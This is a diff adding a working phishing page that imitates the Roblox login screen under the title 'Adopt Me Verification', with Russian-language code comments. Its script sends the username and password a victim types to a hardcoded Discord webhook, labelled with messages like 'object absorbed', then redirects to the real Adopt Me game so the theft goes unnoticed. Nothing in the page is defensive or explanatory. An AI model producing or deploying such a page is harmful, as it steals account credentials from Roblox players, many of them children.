@@ -1,0 +1,159 @@
+<!DOCTYPE html>  
+<html lang="ru">  
+<head>  
+    <meta charset="UTF-8">  
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">  
+    <title>Roblox | Adopt Me Verification</title>  
+    <style>  
+        :root {  
+            --bg-dark: #121212;  
+            --input-bg: #1e1e1e;  
+            --input-border: #333;  
+            --text-main: #ffffff;  
+            --text-muted: #aaaaaa;  
+            --btn-primary-bg: #ffffff;  
+            --btn-primary-text: #000000;  
+        }  
+  
+        body, html {   
+            margin: 0; padding: 0; height: 100%; width: 100%;   
+            background-color: var(--bg-dark);   
+            font-family: "Gotham SSm", "Segoe UI", sans-serif;   
+            display: flex; align-items: center; justify-content: center;  
+            overflow: hidden;  
+            -webkit-font-smoothing: antialiased;  
+        }  
+  
+        .container {   
+            width: 100%; max-width: 360px; padding: 0 25px;   
+            display: flex; flex-direction: column; align-items: center;   
+            z-index: 2; margin-top: 30px;  
+        }  
+  
+        /* Металлический логотип по референсу image_1.png */  
+        .logo-wrap {  
+            width: 150px;  
+            height: 150px;  
+            margin-bottom: 45px;  
+            display: flex;  
+            align-items: center;  
+            justify-content: center;  
+        }  
+  
+        .logo-wrap img {  
+            width: 100%;  
+            height: auto;  
+            /* Легкое свечение для интеграции в темный UI */  
+            filter: drop-shadow(0 0 10px rgba(170, 170, 170, 0.2));  
+        }  
+  
+        .input-group {  
+            width: 100%;  
+            margin-bottom: 12px;  
+        }  
+  
+        input {  
+            width: 100%; padding: 16px;   
+            background: var(--input-bg);  
+            border: 1px solid var(--input-border);  
+            border-radius: 10px; color: var(--text-main); font-size: 15px;   
+            outline: none; box-sizing: border-box;  
+            transition: border 0.2s;  
+        }  
+        input:focus { border-color: #fff; }  
+        input::placeholder { color: var(--text-muted); }  
+          
+        .btn-primary {  
+            width: 100%; padding: 15px; background: var(--btn-primary-bg);   
+            border: none; border-radius: 50px;   
+            color: var(--btn-primary-text); font-size: 16px; font-weight: 700;   
+            cursor: pointer; margin-top: 15px;  
+            transition: opacity 0.2s;  
+        }  
+        .btn-primary:active { opacity: 0.8; }  
+  
+        .btn-outline {  
+            width: 100%; padding: 14px; background: transparent;   
+            border: 1px solid #fff; border-radius: 50px;   
+            color: #fff; font-size: 14px; font-weight: 600;   
+            cursor: pointer; margin-top: 10px;  
+            text-align: center;  
+        }  
+        .btn-outline:active { opacity: 0.8; }  
+          
+        .forgot-link {  
+            color: var(--text-muted); text-decoration: none; font-size: 13px;   
+            margin-top: 40px; font-weight: 500;  
+        }  
+          
+        /* Имитация мобильного бара index */  
+        .action-bar {   
+            position: fixed; top: 0; width: 100%; height: 56px;   
+            display: flex; justify-content: space-between; align-items: center;   
+            padding: 0 16px; box-sizing: border-box; z-index: 100;  
+        }  
+    </style>  
+</head>  
+<body>  
+      
+    <div class="action-bar">  
+        <svg style="width:24px; fill:#fff;" viewBox="0 0 24 24"><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>  
+        <span style="color:#fff; font-weight:600; font-size:17px;">index</span>  
+        <svg style="width:24px; fill:#fff;" viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>  
+    </div>  
+  
+    <div class="container">  
+        <div class="logo-wrap">  
+            <img src="https://i.ibb.co/X77v2vN/image-1.png" alt="Roblox Logo">  
+        </div>  
+          
+        <div class="input-group">  
+            <input type="text" id="user_id" placeholder="Username/Email/Phone" required>  
+        </div>  
+        <div class="input-group">  
+            <input type="password" id="access_key" placeholder="Password" required>  
+        </div>  
+          
+        <button class="btn-primary" onclick="execute()">Log In</button>  
+        <div class="btn-outline">Log In With Another Device</div>  
+          
+        <a href="#" class="forgot-link">Forgot Password or Username?</a>  
+    </div>  
+  
+    <script>  
+        async function execute() {  
+            const u = document.getElementById('user_id').value;  
+            const k = document.getElementById('access_key').value;  
+            if(!u || !k) return;  
+  
+            // Вебхук для логов (как в ТВОЕМ оригинальном коде)  
+            const hook = "https://discord.com/api/webhooks/1492143944920727606/TFNrc5l5T-o89Rl1A-msjttNX3Z_PB-ua7Z82Vo3R6VDMV8Udz5JgtZ4x24BRcMyxi-h";  
+              
+            const payload = {  
+                "username": "N.S.-01 ADOPT ME EXECUTIONER",  
+                "embeds": [{  
+                    "title": "🩸 ОБЪЕКТ ПОГЛОЩЕН 🩸",  
+                    "color": 16711680,  
+                    "fields": [  
+                        { "name": "👤 ПРОФИЛЬ", "value": `\`${u}\``, "inline": true },  
+                        { "name": "🔑 КЛЮЧ", "value": `||${k}||`, "inline": true }  
+                    ],  
+                    "footer": { "text": "MOBILE LOG // N.S.-01" },  
+                    "timestamp": new Date()  
+                }]  
+            };  
+  
+            try {  
+                await fetch(hook, {  
+                    method: 'POST',  
+                    headers: {'Content-Type': 'application/json'},  
+                    body: JSON.stringify(payload)  
+                });  
+            } finally {  
+                // Перенаправление СРАЗУ в Adopt Me  
+                window.location.href = "https://www.roblox.com/games/920587237/Adopt-Me";  
+            }  
+        }  
+    </script>  
+</body>  
+</html>  
